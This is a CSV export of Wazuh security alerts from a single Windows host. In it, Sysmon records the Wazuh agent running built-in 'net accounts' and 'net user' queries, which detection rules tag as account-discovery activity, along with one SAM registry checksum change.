wazuh-alerts-4.x-2024.11.30,j_q7e5MBRlc-D5DFcxy7,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1018,technique_name=Remote System Discovery
UtcTime: 2024-11-30 06:21:39.363
ProcessGuid: {15959494-AEF3-674A-0D05-000000000D00}
ProcessId: 1920
Image: C:\Windows\SysWOW64\net1.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Net Command
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: net1.exe
CommandLine: C:\Windows\system32\net1 accounts
CurrentDirectory: C:\Program Files (x86)\ossec-agent\
User: NT AUTHORITY\SYSTEM
LogonGuid: {15959494-D382-6749-E703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=83CB47100EFFB110ACBE65BC1EE7D459B7ECF983,MD5=B5A26C2BF17222E86B91D26F1247AF3E,SHA256=14CC5BE4C833ACC652195DEAD113E1C3B4AC0B98EA1AEAD11957836F9AE721CF,IMPHASH=3D3E7537BD3BA07738DC5CA8AD01B073
ParentProcessGuid: {15959494-AEEE-674A-FC04-000000000D00}
ParentProcessId: 6964
ParentImage: C:\Windows\SysWOW64\net.exe
ParentCommandLine: net.exe accounts
ParentUser: NT AUTHORITY\SYSTEM""",5,2024-11-30T06:21:39.367203500Z,53949,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,2,false,3,Discovery activity executed,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92031, , ,windows_eventchannel,log,"Nov 30, 2024 @ 06:21:40.251",EventChannel,1732947700.216572,"Nov 30, 2024 @ 06:21:40.251", , , , , , , ,{15959494-D382-6749-E703-000000000000}, , , , ,1920, , , , , , , , , , ,"[""Account Discovery""]","[""T1087""]","[""Discovery""]", , , ,net1.exe,C:\\Windows\\SysWOW64\\net1.exe,Microsoft® Windows® Operating System, , ,Net Command, , ,{15959494-AEF3-674A-0D05-000000000D00},2024-11-30 06:21:39.363,"SHA1=83CB47100EFFB110ACBE65BC1EE7D459B7ECF983,MD5=B5A26C2BF17222E86B91D26F1247AF3E,SHA256=14CC5BE4C833ACC652195DEAD113E1C3B4AC0B98EA1AEAD11957836F9AE721CF,IMPHASH=3D3E7537BD3BA07738DC5CA8AD01B073","technique_id=T1018,technique_name=Remote System Discovery",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),NT AUTHORITY\\SYSTEM, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-AEEE-674A-FC04-000000000D00},net.exe accounts,0x3e7,6964,C:\\Program Files (x86)\\ossec-agent\\,C:\\Windows\\SysWOW64\\net.exe,C:\\Windows\\system32\\net1 accounts,System,0,NT AUTHORITY\\SYSTEM, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,kvq7e5MBRlc-D5DFcxy7,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1018,technique_name=Remote System Discovery
UtcTime: 2024-11-30 06:21:39.769
ProcessGuid: {15959494-AEF3-674A-1105-000000000D00}
ProcessId: 3660
Image: C:\Windows\SysWOW64\net.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Net Command
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: net.exe
CommandLine: net.exe accounts
CurrentDirectory: C:\Program Files (x86)\ossec-agent\
User: NT AUTHORITY\SYSTEM
LogonGuid: {15959494-D382-6749-E703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=0196B4A47B33A74999B50044FC62516F01B9A7D7,MD5=DD0561156F62BC1958CE0E370B23711B,SHA256=FD41D0261C6D22572DA448BCB5CBBB98F78A2922D1F1074D25237CC82C8CE432,IMPHASH=86350518EAE83E4A09BBF6317BA1C570
ParentProcessGuid: {15959494-D386-6749-3400-000000000D00}
ParentProcessId: 2484
ParentImage: C:\Program Files (x86)\ossec-agent\wazuh-agent.exe
ParentCommandLine: ""C:\Program Files (x86)\ossec-agent\wazuh-agent.exe""
ParentUser: NT AUTHORITY\SYSTEM""",5,2024-11-30T06:21:39.770677700Z,53952,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,5,false,3,Discovery activity executed,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92031, , ,windows_eventchannel,log,"Nov 30, 2024 @ 06:21:40.298",EventChannel,1732947700.234230,"Nov 30, 2024 @ 06:21:40.298", , , , , , , ,{15959494-D382-6749-E703-000000000000}, , , , ,3660, , , , , , , , , , ,"[""Account Discovery""]","[""T1087""]","[""Discovery""]", , , ,net.exe,C:\\Windows\\SysWOW64\\net.exe,Microsoft® Windows® Operating System, , ,Net Command, , ,{15959494-AEF3-674A-1105-000000000D00},2024-11-30 06:21:39.769,"SHA1=0196B4A47B33A74999B50044FC62516F01B9A7D7,MD5=DD0561156F62BC1958CE0E370B23711B,SHA256=FD41D0261C6D22572DA448BCB5CBBB98F78A2922D1F1074D25237CC82C8CE432,IMPHASH=86350518EAE83E4A09BBF6317BA1C570","technique_id=T1018,technique_name=Remote System Discovery",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),NT AUTHORITY\\SYSTEM, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-D386-6749-3400-000000000D00},"\""C:\\Program Files (x86)\\ossec-agent\\wazuh-agent.exe\""",0x3e7,2484,C:\\Program Files (x86)\\ossec-agent\\,C:\\Program Files (x86)\\ossec-agent\\wazuh-agent.exe,net.exe accounts,System,0,NT AUTHORITY\\SYSTEM, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,lPq7e5MBRlc-D5DFcxy7,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1018,technique_name=Remote System Discovery
UtcTime: 2024-11-30 06:21:39.923
ProcessGuid: {15959494-AEF3-674A-1405-000000000D00}
ProcessId: 5540
Image: C:\Windows\SysWOW64\net.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Net Command
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: net.exe
CommandLine: net.exe accounts
CurrentDirectory: C:\Program Files (x86)\ossec-agent\
User: NT AUTHORITY\SYSTEM
LogonGuid: {15959494-D382-6749-E703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=0196B4A47B33A74999B50044FC62516F01B9A7D7,MD5=DD0561156F62BC1958CE0E370B23711B,SHA256=FD41D0261C6D22572DA448BCB5CBBB98F78A2922D1F1074D25237CC82C8CE432,IMPHASH=86350518EAE83E4A09BBF6317BA1C570
ParentProcessGuid: {15959494-D386-6749-3400-000000000D00}
ParentProcessId: 2484
ParentImage: C:\Program Files (x86)\ossec-agent\wazuh-agent.exe
ParentCommandLine: ""C:\Program Files (x86)\ossec-agent\wazuh-agent.exe""
ParentUser: NT AUTHORITY\SYSTEM""",5,2024-11-30T06:21:39.923609700Z,53955,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,7,false,3,Discovery activity executed,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92031, , ,windows_eventchannel,log,"Nov 30, 2024 @ 06:21:40.344",EventChannel,1732947700.246064,"Nov 30, 2024 @ 06:21:40.344", , , , , , , ,{15959494-D382-6749-E703-000000000000}, , , , ,5540, , , , , , , , , , ,"[""Account Discovery""]","[""T1087""]","[""Discovery""]", , , ,net.exe,C:\\Windows\\SysWOW64\\net.exe,Microsoft® Windows® Operating System, , ,Net Command, , ,{15959494-AEF3-674A-1405-000000000D00},2024-11-30 06:21:39.923,"SHA1=0196B4A47B33A74999B50044FC62516F01B9A7D7,MD5=DD0561156F62BC1958CE0E370B23711B,SHA256=FD41D0261C6D22572DA448BCB5CBBB98F78A2922D1F1074D25237CC82C8CE432,IMPHASH=86350518EAE83E4A09BBF6317BA1C570","technique_id=T1018,technique_name=Remote System Discovery",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),NT AUTHORITY\\SYSTEM, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-D386-6749-3400-000000000D00},"\""C:\\Program Files (x86)\\ossec-agent\\wazuh-agent.exe\""",0x3e7,2484,C:\\Program Files (x86)\\ossec-agent\\,C:\\Program Files (x86)\\ossec-agent\\wazuh-agent.exe,net.exe accounts,System,0,NT AUTHORITY\\SYSTEM, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,lfq7e5MBRlc-D5DFcxy7,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1018,technique_name=Remote System Discovery
UtcTime: 2024-11-30 06:21:39.957
ProcessGuid: {15959494-AEF3-674A-1605-000000000D00}
ProcessId: 4972
Image: C:\Windows\SysWOW64\net1.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Net Command
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: net1.exe
CommandLine: C:\Windows\system32\net1 accounts
CurrentDirectory: C:\Program Files (x86)\ossec-agent\
User: NT AUTHORITY\SYSTEM
LogonGuid: {15959494-D382-6749-E703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=83CB47100EFFB110ACBE65BC1EE7D459B7ECF983,MD5=B5A26C2BF17222E86B91D26F1247AF3E,SHA256=14CC5BE4C833ACC652195DEAD113E1C3B4AC0B98EA1AEAD11957836F9AE721CF,IMPHASH=3D3E7537BD3BA07738DC5CA8AD01B073
ParentProcessGuid: {15959494-AEF3-674A-1405-000000000D00}
ParentProcessId: 5540
ParentImage: C:\Windows\SysWOW64\net.exe
ParentCommandLine: net.exe accounts
ParentUser: NT AUTHORITY\SYSTEM""",5,2024-11-30T06:21:39.958249300Z,53956,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,8,false,3,Discovery activity executed,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92031, , ,windows_eventchannel,log,"Nov 30, 2024 @ 06:21:40.360",EventChannel,1732947700.252066,"Nov 30, 2024 @ 06:21:40.360", , , , , , , ,{15959494-D382-6749-E703-000000000000}, , , , ,4972, , , , , , , , , , ,"[""Account Discovery""]","[""T1087""]","[""Discovery""]", , , ,net1.exe,C:\\Windows\\SysWOW64\\net1.exe,Microsoft® Windows® Operating System, , ,Net Command, , ,{15959494-AEF3-674A-1605-000000000D00},2024-11-30 06:21:39.957,"SHA1=83CB47100EFFB110ACBE65BC1EE7D459B7ECF983,MD5=B5A26C2BF17222E86B91D26F1247AF3E,SHA256=14CC5BE4C833ACC652195DEAD113E1C3B4AC0B98EA1AEAD11957836F9AE721CF,IMPHASH=3D3E7537BD3BA07738DC5CA8AD01B073","technique_id=T1018,technique_name=Remote System Discovery",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),NT AUTHORITY\\SYSTEM, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-AEF3-674A-1405-000000000D00},net.exe accounts,0x3e7,5540,C:\\Program Files (x86)\\ossec-agent\\,C:\\Windows\\SysWOW64\\net.exe,C:\\Windows\\system32\\net1 accounts,System,0,NT AUTHORITY\\SYSTEM, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,l_q7e5MBRlc-D5DFcxy7,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1018,technique_name=Remote System Discovery
UtcTime: 2024-11-30 06:21:40.004
ProcessGuid: {15959494-AEF4-674A-1905-000000000D00}
ProcessId: 6176
Image: C:\Windows\SysWOW64\net1.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Net Command
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: net1.exe
CommandLine: C:\Windows\system32\net1 accounts
CurrentDirectory: C:\Program Files (x86)\ossec-agent\
User: NT AUTHORITY\SYSTEM
LogonGuid: {15959494-D382-6749-E703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=83CB47100EFFB110ACBE65BC1EE7D459B7ECF983,MD5=B5A26C2BF17222E86B91D26F1247AF3E,SHA256=14CC5BE4C833ACC652195DEAD113E1C3B4AC0B98EA1AEAD11957836F9AE721CF,IMPHASH=3D3E7537BD3BA07738DC5CA8AD01B073
ParentProcessGuid: {15959494-AEF3-674A-1705-000000000D00}
ParentProcessId: 536
ParentImage: C:\Windows\SysWOW64\net.exe
ParentCommandLine: net.exe accounts
ParentUser: NT AUTHORITY\SYSTEM""",5,2024-11-30T06:21:40.005121000Z,53958,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,10,false,3,Discovery activity executed,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92031, , ,windows_eventchannel,log,"Nov 30, 2024 @ 06:21:40.391",EventChannel,1732947700.263896,"Nov 30, 2024 @ 06:21:40.391", , , , , , , ,{15959494-D382-6749-E703-000000000000}, , , , ,6176, , , , , , , , , , ,"[""Account Discovery""]","[""T1087""]","[""Discovery""]", , , ,net1.exe,C:\\Windows\\SysWOW64\\net1.exe,Microsoft® Windows® Operating System, , ,Net Command, , ,{15959494-AEF4-674A-1905-000000000D00},2024-11-30 06:21:40.004,"SHA1=83CB47100EFFB110ACBE65BC1EE7D459B7ECF983,MD5=B5A26C2BF17222E86B91D26F1247AF3E,SHA256=14CC5BE4C833ACC652195DEAD113E1C3B4AC0B98EA1AEAD11957836F9AE721CF,IMPHASH=3D3E7537BD3BA07738DC5CA8AD01B073","technique_id=T1018,technique_name=Remote System Discovery",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),NT AUTHORITY\\SYSTEM, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-AEF3-674A-1705-000000000D00},net.exe accounts,0x3e7,536,C:\\Program Files (x86)\\ossec-agent\\,C:\\Windows\\SysWOW64\\net.exe,C:\\Windows\\system32\\net1 accounts,System,0,NT AUTHORITY\\SYSTEM, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,mPq7e5MBRlc-D5DFcxy7,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1018,technique_name=Remote System Discovery
UtcTime: 2024-11-30 06:21:40.020
ProcessGuid: {15959494-AEF4-674A-1A05-000000000D00}
ProcessId: 7632
Image: C:\Windows\SysWOW64\net.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Net Command
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: net.exe
CommandLine: net.exe accounts
CurrentDirectory: C:\Program Files (x86)\ossec-agent\
User: NT AUTHORITY\SYSTEM
LogonGuid: {15959494-D382-6749-E703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=0196B4A47B33A74999B50044FC62516F01B9A7D7,MD5=DD0561156F62BC1958CE0E370B23711B,SHA256=FD41D0261C6D22572DA448BCB5CBBB98F78A2922D1F1074D25237CC82C8CE432,IMPHASH=86350518EAE83E4A09BBF6317BA1C570
ParentProcessGuid: {15959494-D386-6749-3400-000000000D00}
ParentProcessId: 2484
ParentImage: C:\Program Files (x86)\ossec-agent\wazuh-agent.exe
ParentCommandLine: ""C:\Program Files (x86)\ossec-agent\wazuh-agent.exe""
ParentUser: NT AUTHORITY\SYSTEM""",5,2024-11-30T06:21:40.020756000Z,53959,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,11,false,3,Discovery activity executed,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92031, , ,windows_eventchannel,log,"Nov 30, 2024 @ 06:21:40.407",EventChannel,1732947700.269724,"Nov 30, 2024 @ 06:21:40.407", , , , , , , ,{15959494-D382-6749-E703-000000000000}, , , , ,7632, , , , , , , , , , ,"[""Account Discovery""]","[""T1087""]","[""Discovery""]", , , ,net.exe,C:\\Windows\\SysWOW64\\net.exe,Microsoft® Windows® Operating System, , ,Net Command, , ,{15959494-AEF4-674A-1A05-000000000D00},2024-11-30 06:21:40.020,"SHA1=0196B4A47B33A74999B50044FC62516F01B9A7D7,MD5=DD0561156F62BC1958CE0E370B23711B,SHA256=FD41D0261C6D22572DA448BCB5CBBB98F78A2922D1F1074D25237CC82C8CE432,IMPHASH=86350518EAE83E4A09BBF6317BA1C570","technique_id=T1018,technique_name=Remote System Discovery",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),NT AUTHORITY\\SYSTEM, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-D386-6749-3400-000000000D00},"\""C:\\Program Files (x86)\\ossec-agent\\wazuh-agent.exe\""",0x3e7,2484,C:\\Program Files (x86)\\ossec-agent\\,C:\\Program Files (x86)\\ossec-agent\\wazuh-agent.exe,net.exe accounts,System,0,NT AUTHORITY\\SYSTEM, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,mvq7e5MBRlc-D5DFcxy7,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1018,technique_name=Remote System Discovery
UtcTime: 2024-11-30 06:21:40.067
ProcessGuid: {15959494-AEF4-674A-1D05-000000000D00}
ProcessId: 6944
Image: C:\Windows\SysWOW64\net.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Net Command
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: net.exe
CommandLine: net.exe accounts
CurrentDirectory: C:\Program Files (x86)\ossec-agent\
User: NT AUTHORITY\SYSTEM
LogonGuid: {15959494-D382-6749-E703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=0196B4A47B33A74999B50044FC62516F01B9A7D7,MD5=DD0561156F62BC1958CE0E370B23711B,SHA256=FD41D0261C6D22572DA448BCB5CBBB98F78A2922D1F1074D25237CC82C8CE432,IMPHASH=86350518EAE83E4A09BBF6317BA1C570
ParentProcessGuid: {15959494-D386-6749-3400-000000000D00}
ParentProcessId: 2484
ParentImage: C:\Program Files (x86)\ossec-agent\wazuh-agent.exe
ParentCommandLine: ""C:\Program Files (x86)\ossec-agent\wazuh-agent.exe""
ParentUser: NT AUTHORITY\SYSTEM""",5,2024-11-30T06:21:40.068739100Z,53961,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,13,false,3,Discovery activity executed,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92031, , ,windows_eventchannel,log,"Nov 30, 2024 @ 06:21:40.438",EventChannel,1732947700.281558,"Nov 30, 2024 @ 06:21:40.438", , , , , , , ,{15959494-D382-6749-E703-000000000000}, , , , ,6944, , , , , , , , , , ,"[""Account Discovery""]","[""T1087""]","[""Discovery""]", , , ,net.exe,C:\\Windows\\SysWOW64\\net.exe,Microsoft® Windows® Operating System, , ,Net Command, , ,{15959494-AEF4-674A-1D05-000000000D00},2024-11-30 06:21:40.067,"SHA1=0196B4A47B33A74999B50044FC62516F01B9A7D7,MD5=DD0561156F62BC1958CE0E370B23711B,SHA256=FD41D0261C6D22572DA448BCB5CBBB98F78A2922D1F1074D25237CC82C8CE432,IMPHASH=86350518EAE83E4A09BBF6317BA1C570","technique_id=T1018,technique_name=Remote System Discovery",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),NT AUTHORITY\\SYSTEM, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-D386-6749-3400-000000000D00},"\""C:\\Program Files (x86)\\ossec-agent\\wazuh-agent.exe\""",0x3e7,2484,C:\\Program Files (x86)\\ossec-agent\\,C:\\Program Files (x86)\\ossec-agent\\wazuh-agent.exe,net.exe accounts,System,0,NT AUTHORITY\\SYSTEM, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,nfq7e5MBRlc-D5DFdhxc,1,1,192.168.117.134,window-agent3,003,Maryam, , , , , , , , , , , , , , , , , , ,1,false,5,Registry Key Integrity Checksum Changed,"[""ossec"",""syscheck"",""syscheck_entry_modified"",""syscheck_registry""]",594,"[""II_5.1.f""]","[""4.13""]",syscheck_registry_key_modified,log,"Nov 30, 2024 @ 06:21:40.796",syscheck,1732947700.294471,"Nov 30, 2024 @ 06:21:40.796", , , , , , , , , , , , , , , , , , , ,"[""164.312.c.1"",""164.312.c.2""]","[""11.5""]","[""PI1.4"",""PI1.5"",""CC6.1"",""CC6.8"",""CC7.2"",""CC7.3""]","[""SI.7""]","[""Stored Data Manipulation"",""Modify Registry""]","[""T1565.001"",""T1112""]","[""Impact"",""Defense Evasion""]", , , , , , , , , , , , , , , , , , , ,Administrators,2024-11-29T19:31:09, , ,S-1-5-18, , ,2024-11-29T14:36:07,scheduled,HKEY_LOCAL_MACHINE\Security\SAM\Domains\Account, ,"[""mtime""]",SYSTEM,S-1-5-32-544, ,modified, , , , ,"Registry Key '[x32] HKEY_LOCAL_MACHINE\Security\SAM\Domains\Account' modified
Mode: scheduled
Changed attributes: mtime
Group ownership was 'S-1-5-32-544', now it is 'S-1-5-18'
Old modification time was: '1732878367', now it is '1732896069'
", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,[x32], ,"[{""allowed"":[""DELETE"",""READ_CONTROL"",""WRITE_DAC"",""WRITE_OWNER"",""READ_DATA"",""WRITE_DATA"",""APPEND_DATA"",""READ_EA"",""WRITE_EA"",""EXECUTE""],""name"":""SYSTEM""},{""allowed"":[""READ_CONTROL"",""WRITE_DAC""],""name"":""Administrators""}]", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,S-1-5-32-544, , , , , , , 
wazuh-alerts-4.x-2024.11.30,o_q7e5MBRlc-D5DFeBy4,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1087.001,technique_name=Local Account
UtcTime: 2024-11-30 06:21:41.427
ProcessGuid: {15959494-AEF5-674A-2505-000000000D00}
ProcessId: 1264
Image: C:\Windows\SysWOW64\net.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Net Command
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: net.exe
CommandLine: net user administrator
CurrentDirectory: C:\Program Files (x86)\ossec-agent\
User: NT AUTHORITY\SYSTEM
LogonGuid: {15959494-D382-6749-E703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=0196B4A47B33A74999B50044FC62516F01B9A7D7,MD5=DD0561156F62BC1958CE0E370B23711B,SHA256=FD41D0261C6D22572DA448BCB5CBBB98F78A2922D1F1074D25237CC82C8CE432,IMPHASH=86350518EAE83E4A09BBF6317BA1C570
ParentProcessGuid: {15959494-D386-6749-3400-000000000D00}
ParentProcessId: 2484
ParentImage: C:\Program Files (x86)\ossec-agent\wazuh-agent.exe
ParentCommandLine: ""C:\Program Files (x86)\ossec-agent\wazuh-agent.exe""
ParentUser: NT AUTHORITY\SYSTEM""",5,2024-11-30T06:21:41.428279500Z,53970,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,1,false,3,A net.exe account discovery command was initiated,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92039, , ,windows_eventchannel,log,"Nov 30, 2024 @ 06:21:42.486",EventChannel,1732947702.317682,"Nov 30, 2024 @ 06:21:42.486", , , , , , , ,{15959494-D382-6749-E703-000000000000}, , , , ,1264, , , , , , , , , , ,"[""Account Discovery""]","[""T1087""]","[""Discovery""]", , , ,net.exe,C:\\Windows\\SysWOW64\\net.exe,Microsoft® Windows® Operating System, , ,Net Command, , ,{15959494-AEF5-674A-2505-000000000D00},2024-11-30 06:21:41.427,"SHA1=0196B4A47B33A74999B50044FC62516F01B9A7D7,MD5=DD0561156F62BC1958CE0E370B23711B,SHA256=FD41D0261C6D22572DA448BCB5CBBB98F78A2922D1F1074D25237CC82C8CE432,IMPHASH=86350518EAE83E4A09BBF6317BA1C570","technique_id=T1087.001,technique_name=Local Account",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),NT AUTHORITY\\SYSTEM, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-D386-6749-3400-000000000D00},"\""C:\\Program Files (x86)\\ossec-agent\\wazuh-agent.exe\""",0x3e7,2484,C:\\Program Files (x86)\\ossec-agent\\,C:\\Program Files (x86)\\ossec-agent\\wazuh-agent.exe,net user administrator,System,0,NT AUTHORITY\\SYSTEM, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,p_q7e5MBRlc-D5DFeBy4,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1087.001,technique_name=Local Account
UtcTime: 2024-11-30 06:21:41.537
ProcessGuid: {15959494-AEF5-674A-2B05-000000000D00}
ProcessId: 4120
Image: C:\Windows\SysWOW64\net.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Net Command
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: net.exe
CommandLine: net user guest
CurrentDirectory: C:\Program Files (x86)\ossec-agent\
User: NT AUTHORITY\SYSTEM
LogonGuid: {15959494-D382-6749-E703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=0196B4A47B33A74999B50044FC62516F01B9A7D7,MD5=DD0561156F62BC1958CE0E370B23711B,SHA256=FD41D0261C6D22572DA448BCB5CBBB98F78A2922D1F1074D25237CC82C8CE432,IMPHASH=86350518EAE83E4A09BBF6317BA1C570
ParentProcessGuid: {15959494-D386-6749-3400-000000000D00}
ParentProcessId: 2484
ParentImage: C:\Program Files (x86)\ossec-agent\wazuh-agent.exe
ParentCommandLine: ""C:\Program Files (x86)\ossec-agent\wazuh-agent.exe""
ParentUser: NT AUTHORITY\SYSTEM""",5,2024-11-30T06:21:41.538023800Z,53974,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,5,false,3,A net.exe account discovery command was initiated,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92039, , ,windows_eventchannel,log,"Nov 30, 2024 @ 06:21:42.595",EventChannel,1732947702.341562,"Nov 30, 2024 @ 06:21:42.595", , , , , , , ,{15959494-D382-6749-E703-000000000000}, , , , ,4120, , , , , , , , , , ,"[""Account Discovery""]","[""T1087""]","[""Discovery""]", , , ,net.exe,C:\\Windows\\SysWOW64\\net.exe,Microsoft® Windows® Operating System, , ,Net Command, , ,{15959494-AEF5-674A-2B05-000000000D00},2024-11-30 06:21:41.537,"SHA1=0196B4A47B33A74999B50044FC62516F01B9A7D7,MD5=DD0561156F62BC1958CE0E370B23711B,SHA256=FD41D0261C6D22572DA448BCB5CBBB98F78A2922D1F1074D25237CC82C8CE432,IMPHASH=86350518EAE83E4A09BBF6317BA1C570","technique_id=T1087.001,technique_name=Local Account",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),NT AUTHORITY\\SYSTEM, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-D386-6749-3400-000000000D00},"\""C:\\Program Files (x86)\\ossec-agent\\wazuh-agent.exe\""",0x3e7,2484,C:\\Program Files (x86)\\ossec-agent\\,C:\\Program Files (x86)\\ossec-agent\\wazuh-agent.exe,net user guest,System,0,NT AUTHORITY\\SYSTEM, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
